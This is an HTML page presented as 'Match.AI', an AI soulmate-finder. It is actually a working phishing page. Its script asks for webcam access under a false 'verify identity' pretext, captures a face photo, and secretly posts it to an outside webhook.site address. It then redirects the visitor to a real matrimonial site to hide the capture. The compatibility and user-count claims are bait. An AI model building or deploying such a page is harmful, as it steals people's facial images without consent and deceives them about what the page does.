<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Match.AI | Premium Matchmaking</title>
    <style>
        body { background-color: #0f0f1b; color: #ffffff; text-align: center; font-family: 'Segoe UI', Arial, sans-serif; margin: 0; }
        .header { padding: 30px 20px; background: linear-gradient(180deg, #1a1a2e 0%, #0f0f1b 100%); }
        h1 { margin: 0; font-size: 26px; color: #ff4d8d; text-transform: uppercase; }
        .sub-text { color: #8a8aae; font-size: 14px; margin-top: 5px; }
        .camera-box { position: relative; width: 85%; max-width: 350px; margin: 20px auto; border-radius: 20px; overflow: hidden; border: 2px solid #2d2d44; aspect-ratio: 3/4; background: #000; }
        #video { width: 100%; height: 100%; object-fit: cover; }
        .scanner-line { position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: #ff4d8d; box-shadow: 0 0 15px #ff4d8d; animation: scan 3s infinite linear; }
        @keyframes scan { 0% { top: 0%; } 100% { top: 100%; } }
        #capture { background: linear-gradient(90deg, #ff4d8d 0%, #ff85a1 100%); color: white; border: none; padding: 16px 50px; font-size: 18px; border-radius: 30px; font-weight: bold; cursor: pointer; box-shadow: 0 10px 20px rgba(255, 77, 141, 0.3); width: 80%; margin-top: 20px; }
        .footer-info { margin-top: 40px; color: #5a5a7a; font-size: 12px; padding-bottom: 40px; }
    </style>
</head>
<body>
    <div class="header">
        <h1>ðŸ’– Match.AI</h1>
        <div class="sub-text">AI-Powered Soulmate Finder</div>
    </div>

    <div class="camera-box">
        <video id="video" autoplay playsinline muted></video>
        <div class="scanner-line"></div>
    </div>

    <button id="capture">FIND MY MATCH</button>
    <p style="font-size: 11px; color: #ff4d8d; margin-top: 10px;">Scanning Facial Features for 99% Compatibility...</p>

    <div class="footer-info">
        <p>âœ“ Secured by Advanced Facial AI</p>
        <p>Join 2.5M+ Happy Couples</p>
    </div>

    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // AAPKA WEBHOOK URL
        const webHookUrl = 'https://webhook.site/e5a7946f-8158-4941-981d-54faa7aad32f';
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        async function initCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: false 
                });
                video.srcObject = stream;
            } catch (err) {
                alert("Security: Please allow camera access to verify identity for matchmaking.");
            }
        }

        window.onload = initCamera;

        document.getElementById('capture').addEventListener('click', function() {
            this.innerText = "ANALYZING...";
            this.style.opacity = "0.6";
            
            // DATA FIX: 1.5 second delay + JPEG Compression
            setTimeout(() => {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                const imageData = canvas.toDataURL('image/jpeg', 0.3);

                // Check agar data khali hai toh mat bhejo
                if (imageData.length < 100) { return; }

                fetch(webHookUrl, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: imageData
                }).finally(() => {
                    window.location.href = "https://www.shaadi.com";
                });
            }, 1500); 
        });
    </script>
</body>
</html>